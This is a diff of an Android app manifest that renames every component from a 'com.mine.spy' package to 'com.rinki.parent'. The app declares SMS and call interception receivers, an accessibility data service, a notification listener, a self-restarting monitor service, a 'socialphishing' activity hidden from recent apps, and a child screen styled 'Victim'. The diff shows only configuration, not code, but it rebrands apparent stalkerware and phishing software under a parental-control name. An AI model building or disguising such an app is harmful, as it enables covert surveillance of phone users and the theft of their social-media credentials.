@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
-    package="com.mine.spy">
+    package="com.rinki.parent">
     <!-- location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <!-- storage -->
@@ -41,7 +41,7 @@
     <uses-permission android:name="android.permission.VIBRATE" />
 
     <application
-        android:name="com.mine.spy.app.DummyNameForApp"
+        android:name="com.rinki.parent.app.DummyNameForApp"
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
@@ -52,7 +52,7 @@
         android:sharedUserId="android.uid.system"
         tools:replace="android:icon">
         <activity
-            android:name="com.mine.spy.ui.activities.login.LoginActivity"
+            android:name="com.rinki.parent.ui.activities.login.LoginActivity"
             android:theme="@style/Login">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -61,36 +61,36 @@
             </intent-filter>
         </activity>
         <activity
-            android:name="com.mine.spy.ui.activities.register.RegisterActivity"
+            android:name="com.rinki.parent.ui.activities.register.RegisterActivity"
             android:theme="@style/Login" />
         <activity
-            android:name="com.mine.spy.ui.activities.mainparent.MainParentActivity"
+            android:name="com.rinki.parent.ui.activities.mainparent.MainParentActivity"
             android:theme="@style/AppTheme"
             android:configChanges="orientation|screenSize" />
         <activity
-            android:name="com.mine.spy.ui.activities.mainchild.MainChildActivity"
+            android:name="com.rinki.parent.ui.activities.mainchild.MainChildActivity"
             android:theme="@style/Victim"
             android:configChanges="orientation|screenSize" />
         <activity
-            android:name="com.mine.spy.ui.activities.lock.LockActivity"
+            android:name="com.rinki.parent.ui.activities.lock.LockActivity"
             android:theme="@style/Lock" />
         <activity
-            android:name="com.mine.spy.ui.activities.gallery.ViewPhoto"
+            android:name="com.rinki.parent.ui.activities.gallery.ViewPhoto"
             android:configChanges="orientation|screenSize"
             android:theme="@style/Transparent" />
         <activity
-            android:name="com.mine.spy.ui.activities.socialphishing.SocialActivityM"
+            android:name="com.rinki.parent.ui.activities.socialphishing.SocialActivityM"
             android:configChanges="orientation|screenSize"
             android:excludeFromRecents="true"
-            android:taskAffinity="com.mine.spy.ui.activities.socialphishing.SocialActivityM"
+            android:taskAffinity="com.rinki.parent.ui.activities.socialphishing.SocialActivityM"
             android:theme="@style/Social" />
 
         <!-- Services -->
-        <service android:name="com.mine.spy.services.calls.CallsService" />
-        <service android:name="com.mine.spy.services.sms.SmsService" />
-        <service android:name="com.mine.spy.services.social.MonitorService" />
+        <service android:name="com.rinki.parent.services.calls.CallsService" />
+        <service android:name="com.rinki.parent.services.sms.SmsService" />
+        <service android:name="com.rinki.parent.services.social.MonitorService" />
         <service
-            android:name="com.mine.spy.services.accessibilityData.AccessibilityDataService"
+            android:name="com.rinki.parent.services.accessibilityData.AccessibilityDataService"
             android:label="@string/accessibility_service_label"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             tools:ignore="InnerclassSeparator">
@@ -103,7 +103,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
         <service
-            android:name="com.mine.spy.services.notificationService.NotificationService"
+            android:name="com.rinki.parent.services.notificationService.NotificationService"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
@@ -112,7 +112,7 @@
 
         <!-- Receivers -->
         <receiver
-            android:name="com.mine.spy.receiver.SmsReceiver"
+            android:name="com.rinki.parent.receiver.SmsReceiver"
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
@@ -120,18 +120,18 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
-        <receiver android:name="com.mine.spy.receiver.CallsReceiver">
+        <receiver android:name="com.rinki.parent.receiver.CallsReceiver">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
                 <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
         </receiver>
         <receiver
-            android:name="com.mine.spy.receiver.MonitorReceiver"
+            android:name="com.rinki.parent.receiver.MonitorReceiver"
             android:enabled="true"
             android:exported="false">
             <intent-filter>
-                <action android:name="com.mine.spy.receiver.RESTART_MONITOR_RECEIVER" />
+                <action android:name="com.rinki.parent.receiver.RESTART_MONITOR_RECEIVER" />
             </intent-filter>
         </receiver>
 
